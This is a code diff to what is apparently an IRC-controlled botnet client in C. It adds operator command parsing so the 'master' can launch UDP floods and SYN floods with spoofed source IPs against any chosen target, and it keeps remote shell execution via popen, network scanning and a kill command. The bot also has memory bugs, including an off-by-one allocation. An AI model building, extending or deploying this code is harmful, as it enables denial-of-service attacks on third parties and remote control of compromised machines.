@@ -1,5 +1,9 @@
 #include "../header/header.h"
 
+
+int parse_master_cmd(char **master_cmd, char *buf, int cmd_size);
+void free_master_cmd(char **master_cmd, int cmd_size);
+
 int irc_connect(irc_info *info) {
 
 	// verifies if may use pre configured servers or argument passed server
@@ -159,15 +163,15 @@ int irc_send(char *msg, int len, irc_info *info) {
 
 int irc_listen(irc_info *info) {
 
+	// max quantity of tokens in a message sent by master
+	int max_tokens_qty = 16;
 	int num_read;
-
 	char buf[MAX_BUF], message[MAX_BUF + strlen("Executing command: ") + 30], popen_buf[MAX_BUF + 1];
-
 	char *str_ret;
 
 	// handle command line sent in IRC
 	char command[100];
-
+	char **master_cmd = calloc(16, sizeof(char*));
 	FILE *file_popen;
 	char welcome[] = "ready to obey to the master!";
 
@@ -177,10 +181,22 @@ int irc_listen(irc_info *info) {
 
 		// set the terminating null byte of string before \r character
 		buf[num_read] = '\0';
+		// guarantee that buf doesn't contain CR and LF
+		buf[strcspn(buf, "\r\n")] = 0;
 
 		if ((str_ret = strstr(buf, "PRIVMSG"))) {
 
-			if ((str_ret = strstr(buf, ":!"))) {
+			int token_len = parse_master_cmd(master_cmd, buf, max_tokens_qty);
+
+			#ifdef DEBUG
+			for (int i = 0; i < token_len; i++) {
+				printf("token %d = %s\n", i, master_cmd[i]);
+			}
+			#endif
+
+			// handling sh command
+			if (!strncmp(":!", master_cmd[3], 2)) {
+
 				sprintf(message, "Executing command: %s", (str_ret + 2));
 
 				irc_send(message, strlen(message), info);
@@ -203,50 +219,80 @@ int irc_listen(irc_info *info) {
 
 				pclose(file_popen);
 
-			} else if ((str_ret = strstr(buf, ":@scan sub"))) {
-				//scan_subnetwork(info);
+			} else if (!strcmp(":@attack", master_cmd[3])) {
+				// handle UDP flood
+				if (!strcmp("udp", master_cmd[4])) {
 
-				scan_subnetwork(info, 192, 168, 0);
+					if (token_len < 11) {
+						sprintf(message, "Not enough arguments. Usage: @attack udp <target IP> <number of packets> "
+								"<source port [0 for random]> <destination port [0 for random]> <rate of change "
+								"[0 for default]> <spoof|nospoof> <spoofed IP [ignore if nospoof]>");
+						irc_send(message, strlen(message), info);
 
-				//if (subnet)
-				//	irc_send(subnet, strlen(subnet), info);
-				//else
-				//	irc_send("deu erro", 8, info);
-			} else if ((str_ret = strstr(buf, ":@attack udp"))) {
+					} else {
 
-				attack_info ainfo;
-				ainfo.n_pkts = 10;
-				inet_pton(AF_INET, "172.17.0.2", &(ainfo.d_ip));
-				//inet_pton(AF_INET, "172.17.0.51", &(ainfo.s_ip));
-				ainfo.s_ip = 0;
-				ainfo.spoof_ip = 0;
-				ainfo.d_port = 22;
-				ainfo.s_port = 0;
-				ainfo.np_chg = 5;
+						attack_info ainfo;
+						inet_pton(AF_INET, master_cmd[5], &(ainfo.d_ip));
+						// TODO sanitize inputs
+						ainfo.n_pkts = atoi(master_cmd[6]);
+						ainfo.s_port = atoi(master_cmd[7]);
+						ainfo.d_port = atoi(master_cmd[8]);
+						ainfo.np_chg = atoi(master_cmd[9]);
 
-				udp_flood(&ainfo, info);
+						if (!ainfo.np_chg)
+							ainfo.np_chg = DEFAULT_NP_CHG;
 
-			} else if ((str_ret = strstr(buf, ":@attack tcp"))) {
+						if (!strcmp("spoof", master_cmd[10])) {
 
-				attack_info ainfo;
-				ainfo.n_pkts = 1;
-				inet_pton(AF_INET, "172.17.0.2", &(ainfo.d_ip));
-				//inet_pton(AF_INET, "201.54.192.20", &(ainfo.d_ip));
-				ainfo.s_ip = 0;
-				ainfo.spoof_ip = 0;
-				ainfo.d_port = 80;
-				ainfo.s_port = 0;
-				ainfo.np_chg = 0;
+							ainfo.spoof_ip = 1;
 
-				syn_flood(&ainfo, info);
+							if ((!strcmp(master_cmd[11], "0")) || master_cmd[11] == NULL)
+								ainfo.s_ip = 0;
+							else
+								inet_pton(AF_INET, master_cmd[11], &(ainfo.s_ip));
 
+						} else if (!strcmp("nospoof", master_cmd[10])) {
 
-			} else if ((str_ret = strstr(buf, ":@kill"))) {
+							ainfo.spoof_ip = 0;
+						}
+
+						udp_flood(&ainfo, info);
+					}
+
+				} else if (!strcmp("tcp", master_cmd[4])) {
+
+					if (token_len < 9) {
+						sprintf(message, "Not enough arguments. Usage: @attack tcp <target IP> <number of packets> "
+							       "<source port [0 for random]> <destination port [0 for random]>");
+						irc_send(message, strlen(message), info);
+
+					} else {
+
+						attack_info ainfo;
+						inet_pton(AF_INET, master_cmd[5], &(ainfo.d_ip));
+
+						ainfo.n_pkts = atoi(master_cmd[6]);
+						ainfo.s_port = atoi(master_cmd[7]);
+						ainfo.d_port = atoi(master_cmd[8]);
+
+						syn_flood(&ainfo, info);
+					}
+				}
+
+			} else if (!strcmp(":@scan", master_cmd[3])) {
+
+				scan_network(info, master_cmd[4]);
+
+			} else if (!strcmp(":@kill", master_cmd[3])) {
 				exit(EXIT_SUCCESS);
 			}
+
+		free_master_cmd(master_cmd, token_len);
+
 		} else if ((str_ret = strstr(buf, "PING")) != NULL) {
 			send_pong(info);
 		}
+
 
 		#ifdef DEBUG
 			puts(buf);
@@ -256,6 +302,22 @@ int irc_listen(irc_info *info) {
 
 	return EXIT_SUCCESS;
 }
+
+int parse_master_cmd(char **master_cmd, char *buf, int cmd_size) {
+	char *token = strtok(buf, " ");
+	int i;
+	for (i = 0; i < cmd_size && token; i++, token = strtok(NULL, " ")) {
+		master_cmd[i] = malloc(strlen(token));
+		strcpy(master_cmd[i], token);
+	}
+	return i;
+}
+
+void free_master_cmd(char **master_cmd, int token_len) {
+	for(int i = 0; i < token_len; i++)
+		free(master_cmd[i]);
+}
+
 // return a random nick to use in IRC channel
 char * random_nick() {
 	char rnick[] = "abcdefghijklmnopqrstuvwxyz1234567890";
